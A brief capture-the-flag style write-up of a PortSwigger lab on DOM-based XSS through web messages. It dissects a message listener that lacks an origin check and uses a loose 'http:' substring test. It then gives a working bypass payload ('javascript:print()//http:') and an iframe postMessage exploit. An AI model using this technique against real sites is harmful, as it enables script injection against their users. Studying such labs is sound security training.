# [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

> on the page there is a `"message"` event listener

```
<script>
  window.addEventListener(
    "message",
    function (e) {
      var url = e.data;
      if (url.indexOf("http:") > -1 || url.indexOf("https:") > -1) {
        location.href = url;
      }
    },
    false,
  );
</script>
```

> this script has two issues:

- No origin check, `e.origin` is never inspected, so any window can send it data
- the function only checks if the `"http:"` or the `"https:"` is in the `e.data`

> exploit base idea

```
location.href = "javascript:print()";
```

only the `"http:"` or the `"https:"` needed to be added to the string

```
location.href = "javascript:print()//http:";
```

> send to this event listener a "message"

```
<iframe src="https://xxx.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

- in an `iframe` posting a message to its content `window` object a javascript: URL scheme
- `this.contentWindow.postMessage()` posts the message to its content
- `.postMessage()` first argument is the data (the javascript: URL in this case)
- `.postMessage()` second argument, the `targetOrigin` specifies if the `iframe` content origin is the same as the `targetOrigin` then its sends the message, otherwise not
- but `.postMessage(...,'*')`, `'*'` as `targetOrigin` is a wildcard that tells that don't care of the origin of receiver
- `e.origin` and `targetOrigin` is not the same value
